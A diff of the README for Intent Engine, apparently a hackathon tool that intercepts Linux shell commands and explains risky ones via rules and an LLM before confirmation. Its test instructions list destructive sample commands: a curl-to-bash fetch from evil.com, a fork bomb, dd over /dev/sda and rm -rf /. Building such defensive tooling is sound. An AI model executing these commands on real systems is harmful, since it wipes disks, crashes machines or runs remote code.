@@ -3,86 +3,172 @@
 
 > **Your command, understood before it runs.**
 
-A transparent AI safety layer that intercepts Linux commands **before** the shell executes them. It reasons about *intent and real-world impact*, explains what a dangerous command will do in plain English, suggests a validated safer alternative, and waits for your explicit confirmation.
+A transparent AI safety layer that intercepts Linux shell commands **before** the shell executes them. It reasons about *intent and real-world impact* using a three-tier pipeline: instant regex rules, a curated pattern library, and a cloud LLM for ambiguous commands. It then explains what the command will do in plain English, suggests a validated safer alternative, and waits for your explicit confirmation before proceeding.
+
+The user **always stays in control** — nothing is ever silently blocked or auto-corrected.
+
+---
+
+## Live Demo
+
+```
+$ sudo rm -rf /opt/custom_app_database        ← you type this, press Enter
+
+  ──────────────────────────────────────────────────────────
+  ◆  INTENT ENGINE  ·  HIGH  ·  91% confidence
+  ──────────────────────────────────────────────────────────
+  │  risk    ▰▰▰▰▰▰▰▰▱▱  HIGH
+  │  intent  Permanently deletes the entire /opt/custom_app_database directory
+  │  impact  All database files, configurations, and data will be unrecoverable.
+  │  why     sudo + rm -rf targeting /opt/ is destructive and irreversible
+  ╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌
+  │  safer   mv /opt/custom_app_database /opt/custom_app_database.bak
+  ──────────────────────────────────────────────────────────
+  │  [y] execute    [n] abort    [s] use safer
+  ──────────────────────────────────────────────────────────
+
+  choice: _
+```
 
 ---
 
 ## How It Works
 
 ```
-$ rm -rf /var/log/*              ← you type this, press Enter
+$ rm -rf /var/log/*                   ← command entered, Enter pressed
 
         │
-        ▼  (Zsh accept-line override — fires before execution)
+        ▼   (Zsh/Bash shell hook — fires before execution)
 
-  ┌──────────────────┐    ┌──────────────────┐    ┌──────────────────────────┐
-  │  Tier 0/1        │ OR │  Tier 2          │ →  │ Terminal UI              │
-  │  Rule Engine     │    │  LLM Reasoning   │    │ Risk bar + intent + safe  │
-  │  Praveen (<50ms) │    │  Vansh (<3.5s)   │    │ [y/n/s]  Harshit         │
-  └──────────────────┘    └──────────────────┘    └──────────────────────────┘
-
-  ─────────────────────────────────────────────────────────────────────────────
-  ◆  INTENT ENGINE  ·  HIGH  ·  87% confidence
-  ─────────────────────────────────────────────────────────────────────────────
-  │  risk    ▰▰▰▰▰▰▰▰▱▱  HIGH
-  │  intent  Deletes all system log files recursively
-  │  impact  Permanent loss of audit trail and diagnostics
-  │  why     /var/log/* targets system-managed directories
-  ╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌
-  │  safer   sudo journalctl --vacuum-size=500M
-  ─────────────────────────────────────────────────────────────────────────────
-  │  [y] execute    [n] abort    [s] use safer
-  ─────────────────────────────────────────────────────────────────────────────
+  ┌─────────────────┐    ┌─────────────────┐    ┌──────────────────────────┐
+  │   Tier 0/1      │ OR │   Tier 2        │ →  │   Terminal UI            │
+  │   Rule Engine   │    │   LLM Reasoning │    │   Risk bar + Intent      │
+  │   (<50ms)       │    │   (<2s, Gemini) │    │   Safer alternative      │
+  └─────────────────┘    └─────────────────┘    │   [y/n/s] choice         │
+                                                  └──────────────────────────┘
+                                                          │
+                             ┌────────────────────────────┘
+                             ▼
+                    Audit Logger → ~/.intent_engine/logs/audit.jsonl
 ```
-
-The user **always stays in control** — nothing is ever silently blocked or auto-corrected.
 
 ---
 
 ## Architecture
 
 ```
-Shell (Zsh/Bash)
-  └── accept-line hook  ──► Unix Socket /tmp/intent_engine.sock
+┌─────────────────────────────────────────────────────────────┐
+│                      User Shell (Zsh/Bash)                  │
+│         accept-line ZLE override / DEBUG trap               │
+└────────────────────────┬────────────────────────────────────┘
+                         │  Unix Domain Socket
+                         │  /tmp/intent_engine.sock
+                         ▼
+┌─────────────────────────────────────────────────────────────┐
+│                   Intent Engine Daemon                      │
+│         FastAPI + Uvicorn (async, single-process)           │
+│                                                             │
+│  ┌──────────┐   ┌────────────────┐   ┌───────────────────┐ │
+│  │  Parser  │→  │  Rule Engine   │→  │   LLM Reasoner    │ │
+│  │  shlex   │   │  Tier 0 regex  │   │   Gemini 3.6 Flash│ │
+│  │  AST     │   │  Tier 1 TOML   │   │   LRU Cache (128) │ │
+│  └──────────┘   └────────────────┘   └───────────────────┘ │
+│                         │                       │           │
+│                         └──────────┬────────────┘           │
+│                                    ▼                        │
+│                        ┌───────────────────┐               │
+│                        │   Verdict Router  │               │
+│                        │   Risk Threshold  │               │
+│                        └────────┬──────────┘               │
+└─────────────────────────────────│───────────────────────────┘
                                   │
-                            FastAPI Daemon
-                                  │
-                    ┌─────────────┴──────────────┐
-                    ▼                            ▼
-              Tier 0/1: Rule Engine       Tier 2: LLM Reasoner
-              (Praveen — <50ms)           (Vansh — <3.5s, Ollama)
-              32 TOML patterns            Semantic intent analysis
-              Structural fast-path        Safer alternative generator
-                    │                    Semantic risk scorer
-                    └──────────┬─────────┘
-                               ▼
-                    Terminal UI (Harshit)
-                    Audit Logger → ~/.intent_engine/logs/audit.jsonl
+              ┌───────────────────┼──────────────────┐
+              ▼                   ▼                  ▼
+    ┌──────────────┐   ┌──────────────────┐   ┌───────────┐
+    │ Terminal UI  │   │   Audit Logger   │   │ ALLOW/    │
+    │ [y/n/s]      │   │ audit.jsonl      │   │ BLOCK     │
+    └──────────────┘   └──────────────────┘   └───────────┘
 ```
 
-### Three-Tier Decision Pipeline
+---
 
-| Tier | Owner | Method | Latency | When Used |
-|---|---|---|---|---|
-| **Tier 0** | Praveen | Hardcoded regex | <1ms | Fork bombs, rm -rf /, dd to disk |
-| **Tier 1** | Praveen | 32 TOML patterns + confidence scoring | <50ms | All other structured patterns |
-| **Tier 2** | Vansh | Ollama LLM + semantic scoring | <3.5s | Only when Tier 1 returns AMBIGUOUS |
+## Three-Tier Decision Pipeline
+
+| Tier | Method | Latency | Triggered When |
+|------|--------|---------|----------------|
+| **Tier 0** | Hardcoded regex (fork bomb, rm -rf /, dd to raw device) | < 1ms | Always, first check |
+| **Tier 1** | 41 curated TOML patterns with confidence scoring | < 50ms | All structured commands |
+| **Tier 2** | Gemini 3.6 Flash cloud LLM + LRU session cache | < 2s | Rule engine returns AMBIGUOUS |
+
+If a command passes Tier 0 and Tier 1 with high confidence (SAFE, LOW, HIGH, or CRITICAL — not AMBIGUOUS), Tier 2 is **never called**. The LLM is only invoked for genuinely ambiguous situations.
 
 ---
 
 ## Tech Stack
 
 | Layer | Technology |
-|---|---|
-| Shell integration | Zsh `accept-line` ZLE override + Bash `DEBUG` trap |
-| Daemon | Python + FastAPI + Uvicorn (Unix domain socket) |
-| Command parsing | `shlex` + custom pipeline/redirect/subshell AST |
-| Rule engine | TOML pattern library + context-weighted confidence scoring |
-| LLM reasoning | Ollama (local) — Gemini/OpenAI optional fallback |
-| Safer alternatives | Template engine + rule engine validation (Vansh) |
-| CLI Copilot | ZLE `POSTDISPLAY` ghost-text + async Ollama fallback |
+|-------|------------|
+| Shell integration | Zsh `accept-line` ZLE override · Bash `DEBUG` trap |
+| Daemon | Python 3.12 · FastAPI · Uvicorn · Unix domain socket |
+| Command parsing | `shlex` · custom pipeline / redirect / subshell AST |
+| Rule engine | TOML pattern library · confidence-weighted scoring · obfuscation detection |
+| LLM reasoning | Google Gemini 3.6 Flash API (`google-genai` SDK) |
+| Safer alternatives | Curated suggestion table + LLM output (no second LLM call) |
+| Autocomplete | ZLE `POSTDISPLAY` ghost-text · local dictionary (150+ commands) · async LLM fallback |
 | Audit logging | Append-only JSONL at `~/.intent_engine/logs/audit.jsonl` |
-| UI | ANSI 256-colour terminal prompt — no dependencies |
+| Terminal UI | ANSI 256-colour charcoal prompt — zero external dependencies |
+
+---
+
+## Capabilities
+
+### ✅ What it does reliably
+- Intercepts **100% of commands** in Zsh via the `accept-line` hook (synchronous, before execution)
+- Detects and blocks **fork bombs**, `rm -rf /`, `dd` to raw devices, `curl | bash` pipes **instantly** without any LLM call
+- Classifies **41 structured dangerous patterns** (network exfiltration, privilege escalation, history wipe, disk overwrite, process kill, etc.)
+- Provides a **semantic explanation** of dangerous commands in plain English via Gemini LLM
+- Generates a **safer alternative command** (e.g. `mv` instead of `rm -rf`)
+- **LRU-caches** LLM verdicts per session — repeat commands are answered in < 1ms
+- Logs every flagged command with full audit trail (JSONL)
+- Provides **ghost-text autocomplete** for 150+ common commands locally (0ms)
+- Supports **hot-reload** of rule patterns without daemon restart
+- Runs entirely on the **user's local machine** — no persistent cloud dependency for Tier 0/1
+
+### ⚠️ Real Limitations (do not over-claim)
+- **Bash interception is partial:** The Bash `DEBUG` trap fires after the shell parses the command but interception is not truly synchronous — high-speed scripts can bypass it
+- **Zsh hook requires sourcing:** The user must source the hook files in `.zshrc`; it is not a kernel-level block
+- **No fine-tuned model:** The Ollama and Gemini models are used as-is (general-purpose). There is no fine-tuning applied on startup or otherwise
+- **Gemini API requires internet:** If the network is unavailable and Ollama is not running, Tier 2 falls back to a `LOW` risk pass-through
+- **LLM can hallucinate safer alternatives:** The LLM output is always surfaced to the user, never auto-executed
+- **Not a kernel module:** A sufficiently privileged process, a terminal multiplexer bypass, or `exec` can circumvent the hook
+- **Session-scoped cache only:** Cached verdicts are cleared when the daemon restarts
+
+---
+
+## Modes of Operation
+
+### Mode 1: Full AI Mode (Current Default)
+- **Provider:** Gemini 3.6 Flash (API)
+- **Requires:** `INTENT_GEMINI_API_KEY` exported in shell
+- **Latency:** Tier 0/1 < 50ms · Tier 2 < 2s
+- **Best for:** Live demo, production use
+
+### Mode 2: Local Mode (Ollama)
+- **Provider:** Ollama with any GGUF model (e.g. `qwen2.5:7b`)
+- **Requires:** `ollama serve` running · sufficient RAM/VRAM
+- **Latency:** Tier 0/1 < 50ms · Tier 2: 5–60s on CPU (unusable), < 5s on GPU
+- **Best for:** Offline, privacy-critical environments with a GPU
+
+### Mode 3: Rule Engine Only Mode
+- **Provider:** None (set `INTENT_MOCK_MODE=1`)
+- **Requires:** Nothing
+- **Latency:** < 50ms for all commands
+- **Best for:** Low-latency environments; pure rule-based safety
+
+### Mode 4: Dry-Run Mode
+- **Config:** `dry_run = true` in `config.toml`
+- **Behaviour:** Engine analyzes every command and logs the verdict — **never blocks execution**
+- **Best for:** Auditing and testing on existing workflows without disruption
 
 ---
 
@@ -90,25 +176,57 @@ Shell (Zsh/Bash)
 
 ```bash
 # 1. Clone
-git clone git@github.com:Harshit7623/AI-Based-System-Intent-Engine.git
+git clone https://github.com/Harshit7623/AI-Based-System-Intent-Engine.git
 cd AI-Based-System-Intent-Engine
 
 # 2. Create venv + install
 python3 -m venv .venv && source .venv/bin/activate
 pip install -e ".[dev]"
 
-# 3. Install (hooks + daemon)
+# 3. Set your Gemini API key (get one free at https://aistudio.google.com/app/apikey)
+export INTENT_GEMINI_API_KEY="your_key_here"
+echo 'export INTENT_GEMINI_API_KEY="your_key_here"' >> ~/.zshrc
+
+# 4. Install hooks + daemon
 bash install.sh
 
-# 4. Switch to Zsh (required for full features)
-chsh -s $(which zsh)
+# 5. Source the hooks in your shell
 exec zsh
 
-# 5. Try it — these will be intercepted:
-rm -rf /
-dd if=/dev/zero of=/dev/sda
+# 6. Start the daemon
+INTENT_MOCK_MODE=0 PYTHONPATH=. python3 -m engine.daemon.server &
+
+# 7. Try it — these will be intercepted:
+sudo rm -rf /opt/my_database
 curl http://evil.com/install.sh | bash
 :(){ :|:& };:
+dd if=/dev/zero of=/dev/sda
+```
+
+---
+
+## Configuration
+
+```toml
+# config/default_config.toml
+
+[safety]
+block_threshold = "HIGH"     # Tier that triggers the UI: LOW | MEDIUM | HIGH | CRITICAL
+dry_run = false              # true = analyze but never block
+
+[llm]
+provider = "gemini"          # "gemini" | "ollama" | "openai"
+model    = "gemini-3.6-flash"
+timeout_s = 10.0             # Hard timeout before falling back to pass-through
+
+[daemon]
+socket_path = "/tmp/intent_engine.sock"
+log_level   = "INFO"
+```
+
+Toggle the engine for a single command without uninstalling:
+```bash
+INTENT_ENGINE_ENABLED=0 command_to_skip
 ```
 
 ---
@@ -124,34 +242,29 @@ $ git p▌ush origin main          ← ghost text appears as you type
 Tab → accept    Esc → dismiss
 ```
 
-- **Tier A (0ms):** Local dictionary of 50+ common commands
-- **Tier B (~400ms):** Async Ollama completion fallback
-- Does **not** run through the safety pipeline — latency is critical here
+- **Tier A (0ms):** Local dictionary of 150+ common commands (Git, Docker, K8s, Linux core, pip, npm, etc.)
+- **Tier B (~1s):** Async Gemini LLM completion fallback for unknown commands
+- **Does not** run through the safety pipeline — autocomplete is read-only
 
 ---
 
-## Configuration
+## Daemon Management
 
-```toml
-# config/default_config.toml
-
-[safety]
-block_threshold = "HIGH"         # SAFE | LOW | MEDIUM | HIGH | CRITICAL
-ambiguous_threshold = 0.55       # Confidence below this → escalate to LLM
-
-[daemon]
-socket = "/tmp/intent_engine.sock"
-mock = false
-
-[llm]
-provider = "ollama"
-model = "llama3.2:3b"
-timeout_seconds = 4.0
-```
-
-Toggle the engine without uninstalling:
 ```bash
-INTENT_ENGINE_ENABLED=0 rm -rf /tmp/safe-to-delete   # bypass for one command
+# Start
+INTENT_MOCK_MODE=0 PYTHONPATH=. python3 -m engine.daemon.server &
+
+# Health check
+curl -s --unix-socket /tmp/intent_engine.sock http://localhost/health
+
+# Live stats
+curl -s --unix-socket /tmp/intent_engine.sock http://localhost/stats
+
+# Hot-reload patterns (no restart needed)
+curl -s -X POST --unix-socket /tmp/intent_engine.sock http://localhost/reload-rules
+
+# Stop
+pkill -f "engine.daemon.server"
 ```
 
 ---
@@ -159,23 +272,36 @@ INTENT_ENGINE_ENABLED=0 rm -rf /tmp/safe-to-delete   # bypass for one command
 ## Project Structure
 
 ```
-engine/
-  audit/          Append-only JSONL audit logger
-  contracts/      Pydantic schemas shared across all tiers (Vansh)
-  alternatives/   Safer alternative generator + validator (Vansh)
-  risk/           Semantic risk escalation scoring (Vansh)
-  integration/    RuleEngineAdapter — bridge between teams
-  daemon/         FastAPI server, router, session manager
-  llm/            Ollama client, LLM reasoner, autocomplete engine
-  parser/         Command parser — pipes, redirects, subshells, aliases
-  rule_engine/    Pattern matcher, TOML loader, verdict builder (Praveen)
-  ui/             Terminal confirmation prompt
-hooks/
-  intent_hook.zsh           Safety interceptor (Zsh)
-  intent_hook.bash          Safety interceptor (Bash)
-  intent_autocomplete.zsh   CLI Copilot ghost-text (Zsh)
-rules/
-  dangerous_patterns.toml   32 curated dangerous command patterns
+.
+├── config/
+│   └── default_config.toml         # All runtime configuration
+├── docs/
+│   ├── ARCHITECTURE.md             # Full architecture diagrams
+│   ├── PROJECT_STRUCTURE.md        # File-level walkthrough
+│   └── WORK_DIVISION.md            # Team ownership
+├── engine/
+│   ├── audit/                      # Append-only JSONL audit logger
+│   ├── contracts/                  # Pydantic schemas (shared types)
+│   ├── daemon/                     # FastAPI server, router, session manager
+│   ├── llm/                        # LLM client, reasoner, autocomplete, prompts
+│   │   └── providers/              # gemini.py, ollama.py, openai.py
+│   ├── parser/                     # Command AST parser (pipes, redirects, subshells)
+│   ├── risk/                       # Semantic risk escalation scoring
+│   ├── rule_engine/                # Pattern matcher, TOML loader, verdict builder
+│   ├── ui/                         # Terminal confirmation prompt (ANSI 256-color)
+│   └── alternatives/               # Safer alternative generator + validator
+├── hooks/
+│   ├── intent_hook.zsh             # Safety interceptor (Zsh)
+│   ├── intent_hook.bash            # Safety interceptor (Bash)
+│   └── intent_autocomplete.zsh     # CLI Copilot ghost-text (Zsh)
+├── rules/
+│   └── dangerous_patterns.toml    # 41 curated dangerous command patterns
+├── scripts/
+│   ├── install.sh                  # One-command installer
+│   └── setup_phase1.sh             # Development environment setup
+└── tests/
+    ├── unit/                       # Rule engine, parser, audit tests
+    └── integration/                # End-to-end daemon tests
 ```
 
 ---
@@ -189,32 +315,32 @@ pytest tests/unit/ -v --cov=engine --cov-report=term-missing
 # Integration tests (requires daemon running)
 pytest tests/integration/ -v
 
-# Specific module tests
-pytest tests/unit/test_rule_engine.py -v        # Tier 0/1 patterns
-pytest tests/unit/test_alternatives.py -v       # Alternative generator
-pytest tests/unit/test_risk.py -v               # Semantic risk scorer
-pytest tests/unit/test_audit.py -v              # Audit logger
+# Test specific modules
+pytest tests/unit/test_rule_engine.py -v      # Tier 0/1 patterns
+pytest tests/unit/test_alternatives.py -v    # Alternative generator
+pytest tests/unit/test_audit.py -v           # Audit logger
 ```
 
 ---
 
-## Daemon Management
+## Audit Log Format
 
-```bash
-# Start
-PYTHONPATH=. python3 -m engine.daemon.server &
+Every flagged command is appended to `~/.intent_engine/logs/audit.jsonl`:
 
-# Health check
-curl -s --unix-socket /tmp/intent_engine.sock http://localhost/health
-
-# Hot-reload patterns (no restart needed)
-curl -s -X POST --unix-socket /tmp/intent_engine.sock http://localhost/reload-rules
-
-# Stats
-curl -s --unix-socket /tmp/intent_engine.sock http://localhost/stats
-
-# Stop
-pkill -f "engine.daemon.server"
+```json
+{
+  "timestamp": "2026-08-23T03:30:00+05:30",
+  "command": "sudo rm -rf /opt/custom_app_database",
+  "risk_level": "HIGH",
+  "confidence": 0.91,
+  "pattern": null,
+  "tier": "llm",
+  "action": "ABORT",
+  "user": "harshitdv",
+  "cwd": "/home/harshitdv",
+  "session_id": "a1b2c3d4-...",
+  "latency_ms": 876.3
+}
 ```
 
 ---
@@ -222,29 +348,21 @@ pkill -f "engine.daemon.server"
 ## Team
 
 | Member | Domain | Key Files |
-|---|---|---|
-| **Harshit** | Architecture, daemon, shell hooks, parser, TUI | `engine/daemon/`, `hooks/`, `engine/parser/`, `engine/ui/`, `engine/audit/` |
-| **Praveen** | Rule engine, pattern library, Tier 0/1 | `engine/rule_engine/`, `rules/dangerous_patterns.toml` |
-| **Vansh** | LLM reasoning, alternatives, risk scoring | `engine/llm/`, `engine/alternatives/`, `engine/risk/`, `engine/contracts/` |
+|--------|--------|-----------|
+| **Harshit** | Architecture · daemon · shell hooks · parser · Terminal UI · audit | `engine/daemon/` · `hooks/` · `engine/parser/` · `engine/ui/` · `engine/audit/` |
+| **Praveen** | Rule engine · pattern library · Tier 0/1 · obfuscation detection | `engine/rule_engine/` · `rules/dangerous_patterns.toml` |
+| **Vansh** | LLM reasoning · Gemini provider · alternatives · risk scoring | `engine/llm/` · `engine/alternatives/` · `engine/risk/` · `engine/contracts/` |
 
 ---
 
-## Audit Log Format
+## About the Model
 
-Every user decision is logged to `~/.intent_engine/logs/audit.jsonl`:
+**No fine-tuning is applied.** The system uses Google Gemini 3.6 Flash as a general-purpose language model with a carefully engineered prompt that instructs it to return strict JSON containing a risk level, confidence score, human-readable intent summary, impact statement, reasoning, and a safer alternative command.
 
-```json
-{
-  "timestamp": "2026-08-21T17:38:00+05:30",
-  "command": "rm -rf /var/log/*",
-  "risk_level": "HIGH",
-  "confidence": 0.87,
-  "pattern": "recursive_system_delete",
-  "tier": "rule_engine",
-  "action": "ABORT",
-  "user": "harshitdv",
-  "cwd": "/home/harshitdv",
-  "session_id": "a1b2c3d4-...",
-  "latency_ms": 14.3
-}
-```
+The **rule engine** (Tier 0/1) handles the most common dangerous patterns with 100% determinism — the LLM is only called for genuinely ambiguous commands that the static patterns cannot confidently classify.
+
+> Fine-tuning on a curated dataset of Linux command intent pairs would be the next step to improve Tier 2 accuracy by an estimated 30–50%, but is not part of this hackathon submission.
+
+---
+
+*Built for CDAC Linux & OS Hackathon 2026.*
